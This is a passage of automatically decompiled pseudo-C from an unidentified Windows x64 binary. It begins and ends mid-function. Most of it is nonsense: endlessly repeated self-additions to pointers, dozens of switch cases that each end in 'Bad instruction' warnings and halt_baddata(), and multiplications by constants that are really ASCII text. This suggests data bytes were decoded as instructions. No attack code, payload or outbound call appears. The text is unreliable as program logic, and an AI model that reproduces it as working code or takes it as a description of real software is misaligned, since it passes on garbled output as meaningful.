*pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        uVar26 = cVar9 - 0x29;\n        puVar25 = CONCAT62(0x1400f, uVar26 << 8);\n        if (SCARRY1(cVar9, -0x29)) {\n            pcVar17 = *puVar25;\n        }\n        *pcVar17 = *pcVar17 + pcVar17;\n        if (SCARRY1(pcVar17, '\\0')) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        if (SCARRY1(uVar31, '\\0')) {\n            pcVar17 = *puVar25;\n        }\n        *pcVar17 = *pcVar17 + pcVar17;\n        if (SCARRY1(uVar23, '\\0')) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        puVar24 = puVar25 | arg3 & 0xff;\n        if (SCARRY1(cVar10, '\\0')) {\n            pcVar17 = *puVar24;\n        }\n        *pcVar17 = *pcVar17 + pcVar17;\n        cVar9 = pcVar17 >> 8;\n        pcVar17 = pcVar17 & 0xffffffffffff0000 | CONCAT11(cVar9 + cVar10, pcVar17);\n        if (SCARRY1(cVar9, cVar10)) {\n            pcVar17 = *puVar24;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *puVar24 = *puVar24 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        uVar14 = arg3 & 0xffffffffffff0000;\n        uVar4 = CONCAT11(uVar23 + cVar10, cVar10);\n        pcVar19 = uVar14 | uVar4;\n        if (SCARRY1(uVar23, cVar10)) {\n            pcVar17 = *puVar24;\n        }\n        *pcVar17 = *pcVar17 + pcVar17;\n        uVar23 = cVar10 + uVar31;\n        puVar25 = puVar25 | uVar23;\n        if (SCARRY1(cVar10, uVar31)) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        cVar22 = pcVar17 >> 8;\n        pcVar17 = pcVar17 & 0xffffffffffff0000 | CONCAT11(cVar22 + uVar31, cVar9);\n        if (SCARRY1(cVar22, uVar31)) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        pcVar19[0x1400ff6] = pcVar19[0x1400ff6] + uVar23;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar21 = *pcVar21 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar21 = *pcVar21 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        cVar9 = (arg1 & 0xffffffffffffff00) >> 8;\n        uVar6 = CONCAT11(cVar9 + uVar31, uVar31);\n        pcVar21 = arg1 & 0xffffffffffff0000 | uVar6;\n        if (SCARRY1(cVar9, uVar31)) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        pcVar19[0x1400ff6] = pcVar19[0x1400ff6] + uVar23;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar21 = *pcVar21 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar21 = *pcVar21 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        cVar9 = pcVar17 >> 8;\n        uVar27 = cVar10 + cVar9;\n        uVar4 = uVar4 & 0xffffffffffffff00;\n        pcVar19 = uVar14 | uVar4 | uVar27;\n        if (SCARRY1(cVar10, cVar9)) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        pcVar19[0x1400ff6] = pcVar19[0x1400ff6] + uVar23;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar21 = *pcVar21 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        cVar9 = pcVar17 >> 8;\n        uVar7 = CONCAT11(uVar26 + cVar9, uVar23);\n        puVar25 = uVar7 | 0x1400f0000;\n        if (SCARRY1(uVar26, cVar9)) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        pcVar19[0x1400ff6] = pcVar19[0x1400ff6] + uVar23;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar21 = *pcVar21 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        cVar10 = uVar7 >> 8;\n        pcVar17 = pcVar17 & 0xffffffffffffff00 | cVar9 + cVar10;\n        if (SCARRY1(cVar9, cVar10)) {\n            pcVar17 = *puVar25;\n        }\n        *pcVar17 = *pcVar17 + pcVar17;\n        uVar26 = uVar31 + cVar10;\n        uVar6 = uVar6 & 0xffffffffffffff00;\n        pcVar21 = arg1 & 0xffffffffffff0000 | uVar6 | uVar26;\n        if (SCARRY1(uVar31, cVar10)) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        cVar9 = uVar4 >> 8;\n        uVar4 = CONCAT11(cVar9 + cVar10, uVar27);\n        pcVar19 = uVar14 | uVar4;\n        if (SCARRY1(cVar9, cVar10)) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *(unaff_RBP + 0x1400ff4) = *(unaff_RBP + 0x1400ff4) + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *puVar25 = *puVar25 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        uVar30 = uVar4 >> 8;\n        uVar31 = uVar23 + uVar30;\n        uVar4 = uVar7 & 0xffffffffffffff00 | 0x1400f0000;\n        puVar25 = uVar4 | uVar31;\n        if (SCARRY1(uVar23, uVar30)) {\n            pcVar17 = *puVar25;\n        }\n        *pcVar17 = *pcVar17 + pcVar17;\n        cVar9 = pcVar17 >> 8;\n        piVar18 = pcVar17 & 0xffffffffffff0000 | CONCAT11(cVar9 + uVar30, pcVar17);\n        if (SCARRY1(cVar9, uVar30)) {\n            piVar18 = *puVar25;\n        }\n        cVar10 = piVar18;\n        *piVar18 = *piVar18 + cVar10;\n        *puVar25 = *puVar25 + cVar10;\n        *piVar18 = *piVar18 + cVar10;\n        *pcVar19 = *pcVar19 + cVar10;\n        *piVar18 = *piVar18 + cVar10;\n        pcVar17 = unaff_RSI * 9 + 0xf;\n        *pcVar17 = *pcVar17 + uVar31;\n        *piVar18 = *piVar18 + piVar18;\n        cVar9 = *piVar18;\n        *piVar18 = *piVar18 + cVar10;\n        cVar22 = (uVar7 & 0xffffffffffffff00) >> 8;\n        pcVar17 = piVar18 & 0xffffffffffff0000 | piVar18 / cVar22 & 0xffU | piVar18 % cVar22 << 8;\n        if (SCARRY1(cVar9, cVar10)) {\n            pcVar17 = *puVar25;\n        }\n        cVar9 = pcVar17;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *pcVar17 = *pcVar17 + cVar9;\n        uVar32 = uVar6 >> 8;\n        uVar23 = uVar31 + uVar32;\n        puVar25 = uVar4 | uVar23;\n        if (SCARRY1(uVar31, uVar32)) {\n            pcVar17 = *puVar25;\n        }\n        *pcVar17 = *pcVar17 + pcVar17;\n        cVar9 = pcVar17 >> 8;\n        piVar18 = pcVar17 & 0xffffffffffff0000 | CONCAT11(cVar9 + uVar32, pcVar17);\n        if (SCARRY1(cVar9, uVar32)) {\n            piVar18 = *puVar25;\n        }\n        cVar9 = piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar21 = *pcVar21 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        *unaff_RDI = *unaff_RDI + -1;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        uVar12 = unaff_RSI;\n        uVar43 = unaff_RDI + uVar12;\n        pcVar17 = uVar43;\n        if (SCARRY4(unaff_RDI, uVar12)) {\n            piVar18 = *puVar25;\n        }\n        cVar9 = piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar19 = *pcVar19 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        *unaff_RSI = *unaff_RSI + cVar9;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        uVar12 = uVar12 | uVar43;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar21 = *pcVar21 + uVar23;\n        *piVar18 = *piVar18 + cVar9;\n        *puVar25 = *puVar25 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        *0x14150127b = *0x14150127b + uVar27;\n        *piVar18 = *piVar18 + cVar9;\n        *piVar18 = *piVar18 + uVar26;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        uVar11 = cVar9 + *piVar18;\n        pcVar17 = piVar18 & 0xffffffffffffff00 | uVar11;\n        *pcVar17 = *pcVar17 + uVar11;\n        uVar11 = uVar11 + *pcVar17;\n        piVar18 = piVar18 & 0xffffffffffffff00 | uVar11;\n        uVar31 = *piVar18;\n        *piVar18 = *piVar18 + uVar11;\n        uVar44 = (uVar43 - uVar12) - CARRY1(uVar31, uVar11);\n        pcVar17 = uVar44;\n        if (SBORROW4(uVar43, uVar12) != SBORROW4(uVar43 - uVar12, CARRY1(uVar31, uVar11))) {\n            piVar18 = *puVar25;\n        }\n        cVar9 = piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *uVar12 = *uVar12 + uVar26;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        uVar31 = cVar9 + *piVar18;\n        uVar4 = piVar18 & 0xffffffffffffff00;\n        piVar18 = uVar4 | uVar31;\n        *piVar18 = *piVar18 + uVar31;\n        uVar6 = CONCAT11(uVar30 & uVar32, uVar27);\n        pcVar29 = uVar14 | uVar6;\n        *piVar18 = *piVar18 + uVar31;\n        *pcVar21 = *pcVar21 + (uVar4 >> 8);\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + uVar31;\n        uVar31 = uVar31 + *piVar18;\n        pcVar19 = uVar4 | uVar31;\n        *pcVar19 = *pcVar19 + uVar31;\n        uVar31 = uVar31 + *pcVar19;\n        piVar18 = uVar4 | uVar31;\n        *piVar18 = *piVar18 + uVar31;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + uVar31;\n        if (SBORROW4(uVar12, uVar44)) {\n            piVar18 = *puVar25;\n        }\n        cVar9 = piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar29 = *pcVar29 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar29 = *pcVar29 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        pcVar19 = (uVar12 - uVar44) + pcVar17 * 8;\n        cVar9 = *pcVar19;\n        *pcVar19 = *pcVar19 + cVar22;\n        if (SCARRY1(cVar9, cVar22)) {\n            piVar18 = *puVar25;\n        }\n        cVar9 = piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar17 = *pcVar17 + cVar22;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        uVar31 = cVar9 + *piVar18;\n        piVar20 = piVar18 & 0xffffffffffffff00 | uVar31;\n        *piVar20 = *piVar20 + uVar31;\n        uVar14 = uVar12 - uVar44 ^ uVar44;\n        *piVar20 = *piVar20 + uVar31;\n        *(unaff_RBP + 0x1400ffd) = *(unaff_RBP + 0x1400ffd) + ((piVar18 & 0xffffffffffffff00) >> 8);\n        *piVar20 = *piVar20 + uVar31;\n        *puVar25 = *puVar25 + uVar31;\n        *piVar20 = *piVar20 + uVar31;\n        *pcVar29 = *pcVar29 + uVar31;\n        *piVar20 = *piVar20 + uVar31;\n        pcVar19 = uVar14 + pcVar17 * 8;\n        cVar9 = *pcVar19;\n        cVar10 = uVar6 >> 8;\n        *pcVar19 = *pcVar19 + cVar10;\n        if (SCARRY1(cVar9, cVar10)) {\n            piVar20 = *puVar25;\n        }\n        cVar9 = piVar20;\n        *piVar20 = *piVar20 + cVar9;\n        *pcVar17 = *pcVar17 + cVar10;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar20 = *piVar20 + piVar20;\n        *piVar20 = *piVar20 + cVar9;\n        uVar31 = cVar9 + *piVar20;\n        piVar18 = piVar20 & 0xffffffffffffff00 | uVar31;\n        *piVar18 = *piVar18 + uVar31;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + uVar31;\n        if (SBORROW1(uVar32, cVar10)) {\n            piVar18 = *puVar25;\n        }\n        cVar10 = piVar18;\n        *piVar18 = *piVar18 + cVar10;\n        *0x14150132b = *0x14150132b + uVar32;\n        *piVar18 = *piVar18 + cVar10;\n        *0x143100335 = *0x143100335 + cVar10;\n        *piVar18 = *piVar18 + cVar10;\n        pcVar21 = pcVar21 + -2;\n        cVar9 = *pcVar21;\n        *pcVar21 = *pcVar21 + cVar10;\n        if (SCARRY1(cVar9, cVar10)) {\n            piVar18 = *puVar25;\n        }\n        cVar10 = piVar18;\n        *piVar18 = *piVar18 + cVar10;\n        pcVar21 = uVar14 - 2;\n        cVar9 = *pcVar21;\n        *pcVar21 = *pcVar21 + cVar10;\n        if (SCARRY1(cVar9, cVar10)) {\n            piVar18 = *puVar25;\n        }\n        cVar9 = piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar29 = *pcVar29 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar29 = *pcVar29 + cVar9;\n        *piVar18 = *piVar18 + cVar9;\n        pcVar21 = puVar25 + -2;\n        cVar9 = *pcVar21;\n        *pcVar21 = *pcVar21 + uVar23;\n        if (SCARRY1(cVar9, uVar23)) {\n            piVar18 = *puVar25;\n        }\n        cVar9 = piVar18;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar17 = *pcVar17 + cVar22;\n        *pcVar17 = *pcVar17 + -1;\n        iVar13 = piVar18;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        *unaff_R15 = *unaff_R15 + -1;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + iVar13;\n        *piVar18 = *piVar18 + cVar9;\n        uVar12 = iVar13 + *piVar18;\n        piVar18 = uVar12;\n        *piVar18 = *piVar18 + uVar12;\n        uVar12 = uVar12 + *piVar18;\n        *uVar12 = *uVar12 + uVar12;\n        *pcVar17 = *pcVar17 + -1;\n        uVar23 = uVar23 - 0x30;\n        *pcVar17 = *pcVar17 + -1;\n        pcVar21 = auStack256 | uVar23;\n        *pcVar21 = *pcVar21 + uVar23;\n        uVar23 = uVar23 + *pcVar21;\n        piVar18 = auStack256 | uVar23;\n        *piVar18 = *piVar18 + uVar23;\n        *pcVar17 = *pcVar17 + -1;\n        *piVar18 = *piVar18 + piVar18;\n        *piVar18 = *piVar18 + uVar23;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x32:\n    case 0x43:\n    case 0x65:\n    case 0x70:\n    case 0x85:\n    case 0xa2:\n    case 0xb3:\n    case 0xea:\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    case 0x44:\n    case 0x66:\n    case 0x71:\n    case 0x86:\n    case 0xa3:\n    case 0xb4:\n    case 0xeb:\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x34:\n    case 0x45:\n    case 0x67:\n    case 0x72:\n    case 0x87:\n    case 0xa4:\n    case 0xb5:\n    case 0xec:\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n    case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x36:\n    case 0xa6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x37:\n    case 0xa7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3b:\n    case 0xab:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3c:\n    case 0xac:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3d:\n    case 0xad:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3e:\n    case 0xae:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3f:\n    case 0xaf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x40:\n    case 0xb0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x41:\n    case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x42:\n    case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    case 0xb7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48:\n    case 0x80:\n    case 0x8c:\n    case 0xb8:\n    case 0xd5:\n    case 0xe5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    case 0x81:\n    case 0x8d:\n    case 0xb9:\n    case 0xd6:\n    case 0xe6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4a:\n    case 0x82:\n    case 0x8e:\n    case 0xba:\n    case 0xd7:\n    case 0xe7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n    case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4c:\n    case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4d:\n    case 0x53:\n    case 0x58:\n    case 0x6a:\n    case 0xbd:\n    case 0xc3:\n    case 200:\n    case 0xda:\n    case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4e:\n    case 0x54:\n    case 0x59:\n    case 0x6b:\n    case 0xbe:\n    case 0xc4:\n    case 0xc9:\n    case 0xdb:\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4f:\n    case 0x55:\n    case 0x5a:\n    case 0x6c:\n    case 0xbf:\n    case 0xc5:\n    case 0xca:\n    case 0xdc:\n    case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x50:\n    case 0x5b:\n    case 0xc0:\n    case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x51:\n    case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x52:\n    case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x56:\n    case 0xc6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x57:\n    case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5c:\n    case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5e:\n    case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    case 0xcf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    case 0x7b:\n    case 0x89:\n    case 0xd0:\n    case 0xe0:\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    case 0x7c:\n    case 0x8a:\n    case 0xd1:\n    case 0xe1:\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    case 0x7d:\n    case 0xd2:\n    case 0xe2:\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x68:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x69:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6f:\n        break;\n    case 0x73:\n    case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74:\n    case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x75:\n    case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x76:\n    case 0xf0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x77:\n    case 0xf1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x78:\n    case 0xf2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x79:\n    case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7a:\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7e:\n    case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7f:\n    case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x83:\n    case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x84:\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x88:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x90:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (0xfffffffebff028ff < uVar14 || puVar15 == NULL) {\n        puVar15 = unaff_RDI + unaff_RBP * 2 + 99;\n        *puVar15 = *puVar15 & 0xd7;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *0x1400fd773 = *0x1400fd773 & 0xd7;\n    uVar26 = puVar15 >> 8;\n    *0x160394d67 = *0x160394d67 & uVar26;\n    iVar13 = arg3;\n    if (0x6968741f < uVar43) {\n        ppuVar33 = *(arg1 + 0x5f) * 0x69727473;\n        puVar16 = unaff_RSI + 1;\n        out(*unaff_RSI, uVar28);\n        puVar42 = iVar13;\n        bVar45 = uVar31 < *puVar42;\n        bVar47 = uVar31 == *puVar42;\n        puStack104 = unaff_RDI;\n        if (!SBORROW1(uVar31, *puVar42)) {\n            if (!bVar45) {\n                puVar42 = arg3 + 0x61;\n                bVar45 = CARRY1(*puVar42, uVar26);\n                *puVar42 = *puVar42 + uVar26;\n                bVar47 = *puVar42 == 0;\n                if (!bVar45) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                uVar12 = *(unaff_RDI + 0x73);\n                if (!bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\ncode_r0x0001400fd8b0:\n                arg1 = uVar12;\n                if (bVar47) {\ncode_r0x0001400fd924:\n                    if (!bVar45) goto code_r0x0001400fd98f;\n                    arg1 = *(puStack104 + 0x73);\n                    if (bVar47) goto code_r0x0001400fd99d;\n                }\n                else {\n                    bVar45 = *(puVar16 + 0x67) * 0x6e693a3a != *(puVar16 + 0x67) * 0x6e693a3a;\n                    if (!bVar45) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    if (bVar45) {\ncode_r0x0001400fd931:\n                        if (!bVar45) goto code_r0x0001400fd99c;\n                        arg1 = *(unaff_RDI + 0x73);\n                        if (!bVar47) {\n                            return;\n                        }\n                        if (!bVar47) {\n                            bVar48 = *(puVar16 + 0x67) * 0x6f633a3a != *(puVar16 + 0x67) * 0x6f633a3a;\n                            goto code_r0x0001400fd9dc;\n                        }\n                        *puVar16 = *puVar16 & arg1 >> 8;\n                        goto code_r0x0001400fd9a1;\n                    }\n                    *puVar15 = *puVar15 + cVar9;\n                    puVar42 = arg3 + 0x61;\n                    uVar31 = *puVar42;\n                    *puVar42 = *puVar42 + uVar26;\n                    bVar47 = *puVar42 == 0;\n                    if (!CARRY1(uVar31, uVar26)) {\n                        puVar42 = iVar13 + 0x61;\n                        bVar45 = CARRY1(*puVar42, uVar26);\n                        *puVar42 = *puVar42 + uVar26;\n                        bVar47 = *puVar42 == 0;\n                        goto code_r0x0001400fd931;\n                    }\n                    arg1 = *(unaff_RDI + 0x73);\n                    if (!bVar47) {\n                        bVar45 = *(puVar16 + 0x67) * 0x535f3a3a != *(puVar16 + 0x67) * 0x535f3a3a;\n                        goto code_r0x0001400fd8d0;\n                    }\n                }\n                puVar35 = *(arg1 + 0x5f) * 0x69727473;\n                puVar42 = puVar16 + 1;\n                out(*puVar16, uVar28);\n                if (arg1 >> 8 < *iVar13) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar15 = uVar43 + 0x85968cc2;\n                *(in_GS_OFFSET + 0x1400fd700) = *(in_GS_OFFSET + 0x1400fd700) + ')';\n                goto code_r0x0001400fd9bc;\n            }\n            puStack104 = *ppuVar33;\n            ppuVar33 = ppuVar33 + 1;\n            if (!bVar45) {\n                out(*puVar16, uVar28);\n                return;\n            }\n            puVar42 = puVar16;\n            if (!bVar45) {\n                out(*puVar16, uVar28);\n                return;\n            }\ncode_r0x0001400fd907:\n            if (!bVar45) {\n                puVar16 = puVar42 + 1;\n                out(*puVar42, uVar28);\n                uVar31 = arg1 >> 8;\n                bVar45 = uVar31 < *iVar13;\n                bVar46 = (POPCOUNT(uVar31 - *iVar13) & 1U) == 0;\n                if (bVar45) {\n                    *(in_GS_OFFSET + 0x1400fd700) = *(in_GS_OFFSET + 0x1400fd700) + ')';\n                    goto code_r0x0001400fd977;\n                }\n                goto code_r0x0001400fd90f;\n            }\n            uVar14 = *(arg3 + 0x65) * 0x28202928;\n            puStack104 = uVar14 & 